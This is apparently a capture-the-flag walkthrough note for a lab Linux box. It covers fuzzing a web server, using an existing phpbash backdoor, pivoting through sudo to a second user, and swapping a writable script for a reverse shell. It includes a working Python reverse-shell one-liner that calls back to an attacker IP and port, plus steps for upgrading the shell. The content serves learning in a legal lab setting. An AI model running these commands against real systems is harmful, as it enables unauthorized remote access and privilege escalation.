# Enumeration
## Port 80
- This pulls up a site that talks about a pentest tool that was designed on this server meaning it should be here somewhere!!
- Running a [[ffuf]] on the site we find a few subdomains that listed below:
```bash

- Checking them all out we found our `phpbash.php` file that was talked about being under: `/dev/phpbash.php`


---

# Exploitation
## phpbash.php
- The site had a backdoor on it already using this we are able to have a shell to the sever.

# Lateral Movement to user
## Local Enumeration
- User: `www-data`
	- **sudo -l**
		- `(scriptmanager : scriptmanager) NOPASSWD: ALL`

- User: `scriptmanager`
	- Located a directory at: `/scripts` that this user can read-write-execute to
		- `test.py`
			- scriptmanager is owner
			- Looks like this edits the `test.txt` file meaning that it must have root access at some point
			- Changed this file out with a reverse shell: ![[Reverse Shell#Python]]
		- `test.txt`
			- root is owner

## Lateral Movement vector
- Initial shell at `http://$RHOST/dev/phpbash.php` gives us access to user: **www-data**
	- From this shell we can establish a more stable environment by calling back to our machine with:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.134",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- Then upgrade the shell for a few more amenities:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Run in the shell
export TERM=xterm-256color # whatever your original $TERM value is && Run in shell
ctrl + z
stty raw -echo ;fg # Run on our machine
```

- We located that www-data user can run sudo commands as `scriptmanager` this means we can spawn a shell under this user:
```bash
sudo -u scriptmanager /bin/bash
```
